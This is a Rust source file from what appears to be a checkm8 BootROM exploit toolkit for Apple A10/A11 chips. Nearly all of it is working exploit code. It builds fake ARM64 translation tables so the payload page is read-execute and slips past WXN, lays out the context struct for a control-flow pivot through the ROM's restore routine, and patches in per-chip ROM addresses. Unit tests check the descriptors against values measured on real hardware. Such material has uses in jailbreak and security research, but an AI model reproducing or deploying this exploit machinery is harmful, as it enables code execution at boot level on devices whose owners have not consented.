//! Build the device-side payload image.
//!
//! The payload *code* is assembled from `payload/checkm8_payload.S` by clang
//! at build time (see `build.rs`), so the bytes in this crate are always the
//! bytes that source produces. The page tables the exploit switches to are
//! built here at run time, because they depend on the profile.
//!
//! The descriptor encoder is validated by round-tripping descriptors measured
//! out of the A11's live translation table (see `tests/cm8_payload.rs`). That
//! matters because the attributes this ROM uses are the ones its MAIR actually
//! describes, and a bit pattern that looks right in the manual can still be a
//! page the CPU will not fetch from.

/// Image layout, shared with the assembly. The code must fit below the L1.
pub const FAKE_L1_OFF: usize = 0x4000;
pub const FAKE_L2_OFF: usize = 0x8000;
pub const CTX_OFF: usize = 0xC000;

/// Geometry of the measured regime: 36-bit VA, 16 KiB granule, two levels of
/// 11 index bits. L1 index = VA[35:25], L2 index = VA[24:14], offset = VA[13:0].
// The entry counts and the L2 index are part of the documented geometry and
/// are used by the tables' construction and tests alike.
#[allow(dead_code)]
pub const L1_ENTRIES: usize = 2048;
pub const L2_ENTRIES: usize = 2048;
pub const PAGE: u64 = 0x4000;
const L1_SPAN: u64 = 0x2000000;

const DESC_PAGE: u64 = 3;
const DESC_BLOCK: u64 = 1;
const DESC_TABLE: u64 = 3;
const ATTR_IDX_EXEC: u64 = 1 << 2;
const NS: u64 = 1 << 5;
const SH_OUTER: u64 = 2 << 8;
const AF: u64 = 1 << 10;
/// The upper attribute bits the ROM's *page* descriptors carry. Its level-1
/// block descriptors carry none, and its table descriptors carry 0x8000...
/// instead - measured, not assumed, which is why there are two constants.
const PAGE_UPPER: u64 = 0x0060000000000000;
const TABLE_UPPER: u64 = 0x8000000000000000;
const PA_MASK: u64 = 0x0000FFFFFFFFC000;

/// Access permission field, bits[7:6] of a descriptor.
pub const AP_RW: u64 = 0 << 6;
pub const AP_RO: u64 = 2 << 6;

/// The L1 index for a VA.
pub fn l1_index(va: u64) -> usize {
    ((va >> 25) & 0x7FF) as usize
}

/// The L2 index for a VA.
#[allow(dead_code)] // used by the table construction and its tests
pub fn l2_index(va: u64) -> usize {
    ((va >> 14) & 0x7FF) as usize
}

/// A level-2 page descriptor, as the ROM's own table encodes one.
pub fn page_desc(pa: u64, ap: u64) -> u64 {
    PAGE_UPPER | (pa & PA_MASK) | ATTR_IDX_EXEC | NS | ap | SH_OUTER | AF | DESC_PAGE
}

/// A level-1 block descriptor, as the ROM's own table encodes one.
pub fn block_desc(pa: u64, ap: u64) -> u64 {
    (pa & PA_MASK) | ATTR_IDX_EXEC | NS | ap | SH_OUTER | AF | DESC_BLOCK
}

/// A level-1 table descriptor pointing at a second-level table.
pub fn table_desc(next_table_pa: u64) -> u64 {
    TABLE_UPPER | (next_table_pa & PA_MASK) | DESC_TABLE
}

/// A short description of a descriptor, for error messages.
#[allow(dead_code)]
pub fn describe(entry: u64) -> String {
    let kind = match entry & 3 {
        0 => "invalid",
        1 => "block",
        3 => "table/page",
        _ => "?",
    };
    let ap = (entry >> 6) & 3;
    let which = ["rw", "ro-user", "ro", "reserved"][(ap & 3) as usize];
    format!(
        "{kind}, attr={}, ap={ap}({which}), af={}",
        (entry >> 2) & 7,
        (entry >> 10) & 1
    )
}

/// The assembled payload code, from `payload/checkm8_payload.S`.
pub fn code() -> &'static [u8] {
    include_bytes!(concat!(env!("OUT_DIR"), "/payload.bin"))
}

/// A payload image for one profile: the code, the fake tables, the context
/// struct. Fails rather than emitting an image whose tables are not where the
/// assembly expects, because that failure is invisible until silicon.
pub fn build(profile: &crate::profile::Profile) -> Result<Vec<u8>, String> {
    let code = code();
    let base = profile.need("image_base");
    let rom = profile.need("rom_base");
    let l1_base = base + FAKE_L1_OFF as u64;
    let l2_base = base + FAKE_L2_OFF as u64;

    let mut image = vec![0u8; CTX_OFF + 0x400];
    image[..code.len()].copy_from_slice(code);

    // --- the fake L1: the ROM's own block descriptor (so anything that still
    // fetches the ROM during stage2 keeps working) and one table entry for the
    // SRAM window the payload is in.
    put(
        &mut image,
        FAKE_L1_OFF + l1_index(rom) * 8,
        block_desc(rom, AP_RO),
    );
    put(
        &mut image,
        FAKE_L1_OFF + l1_index(base) * 8,
        table_desc(l2_base),
    );

    // --- the fake L2: every 16 KiB page read-write, except the payload's own
    // page, which is read-execute. That one entry is the whole reason the fake
    // table exists: SCTLR.WXN is set, and WXN only blocks *writable* pages.
    let window = base & !(L1_SPAN - 1);
    for i in 0..L2_ENTRIES {
        let va = window + i as u64 * PAGE;
        let ap = if va == base { AP_RO } else { AP_RW };
        put(&mut image, FAKE_L2_OFF + i * 8, page_desc(va, ap));
    }

    // --- the context struct the pivot consumes, laid out in the restore
    // routine's own field order: x1 at +0xf8 becomes SP (and TTBR0/VBAR/ELR/
    // SPSR), x29 at +0xe8 becomes the return address in the context entry.
    put(&mut image, CTX_OFF + 0xE8, base + stage2_offset() as u64);
    put(&mut image, CTX_OFF + 0xF0, profile.need("ctx_entry"));
    put(&mut image, CTX_OFF + 0xF8, l1_base);
    // CTX_OFF is not in the restore routine's field list, but it is where the
    // callback's arg0 comes from, so the host sets the pair to (ctx, pivot).
    put(&mut image, CTX_OFF, base + CTX_OFF as u64);

    // The tables stage2 reads: the ROM's own stage-1 root to restore, and the
    // vector table it installed. Both are per-build, and the source's defaults
    // are a syntax-check convenience rather than a value any part uses.
    put(
        &mut image,
        symbol_offset("rom_ttbr0"),
        profile.need("ttbr0"),
    );
    if let Some(vbar) = profile.get("vbar") {
        put(&mut image, symbol_offset("rom_vbar"), vbar);
    }

    Ok(image)
}

/// A symbol's offset inside the payload code, from the table the build script
/// emits next to the assembled blob. The layout is where the assembly puts
/// it, so a symbol moved by an edit is a symbol this cannot find either.
fn symbol_offset(name: &str) -> usize {
    let table = include_str!(concat!(env!("OUT_DIR"), "/payload.sym"));
    for line in table.lines() {
        // The table is "name 0xvalue" per line, as build.rs writes it.
        let mut it = line.split_whitespace();
        if let (Some(found), Some(addr)) = (it.next(), it.next()) {
            if found == name {
                return usize::from_str_radix(addr.trim_start_matches("0x"), 16)
                    .expect("a payload symbol");
            }
        }
    }
    panic!("the payload object has no {name} symbol");
}

fn stage2_offset() -> usize {
    symbol_offset("stage2")
}

fn put(image: &mut [u8], off: usize, value: u64) {
    image[off..off + 8].copy_from_slice(&value.to_le_bytes());
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::profile::A11_R14;

    /// The encoder reproduces the ROM's own descriptors, bit for bit. These are
    /// values read out of the A11's live translation table.
    #[test]
    fn the_encoder_reproduces_the_measured_descriptors() {
        assert_eq!(block_desc(0x100000000, AP_RO), 0x00000001000006A5);
        assert_eq!(page_desc(0x18001C000, AP_RW), 0x006000018001C627);
        assert_eq!(page_desc(0x18001C000, AP_RO), 0x006000018001C6A7);
    }

    #[test]
    fn the_fake_tables_land_where_the_assembly_expects() {
        let image = build(&A11_R14).expect("build");
        let base = A11_R14.need("image_base");

        let l1 = FAKE_L1_OFF + l1_index(base) * 8;
        let entry = u64::from_le_bytes(image[l1..l1 + 8].try_into().unwrap());
        assert_eq!(entry & 3, DESC_TABLE);

        let code = FAKE_L2_OFF + l2_index(base) * 8;
        let code_desc = u64::from_le_bytes(image[code..code + 8].try_into().unwrap());
        assert_eq!(
            (code_desc >> 6) & 3,
            2,
            "the payload page must be read-only"
        );
        assert_eq!(code_desc, page_desc(base, AP_RO), "{}", describe(code_desc));

        let other = FAKE_L2_OFF;
        let other_desc = u64::from_le_bytes(image[other..other + 8].try_into().unwrap());
        assert_eq!(
            (other_desc >> 6) & 3,
            0,
            "every other page must be read-write"
        );

        // the context struct's x1 slot holds the table base the pivot will use
        let x1 = CTX_OFF + 0xF8;
        let x1 = u64::from_le_bytes(image[x1..x1 + 8].try_into().unwrap());
        assert_eq!(x1, base + FAKE_L1_OFF as u64);
    }

    #[test]
    fn the_payloads_own_tables_carry_the_parts_values() {
        use crate::profile::A10;
        let image = build(&A10).expect("build the A10 payload");
        // The source's defaults are the A11's; the A10's own root must replace
        // them, or stage2 would restore a table the ROM never installed.
        let at = symbol_offset("rom_ttbr0");
        let got = u64::from_le_bytes(image[at..at + 8].try_into().unwrap());
        assert_eq!(got, A10.need("ttbr0"));
        assert_ne!(got, 0x18000C000);
    }

    #[test]
    fn a_mutated_descriptor_is_not_the_measured_one() {
        // The round-trip above has to be able to fail, or it says nothing.
        let wrong = page_desc(0x18001C000, AP_RW) | 0x80;
        assert_ne!(wrong, 0x006000018001C627);
    }
}
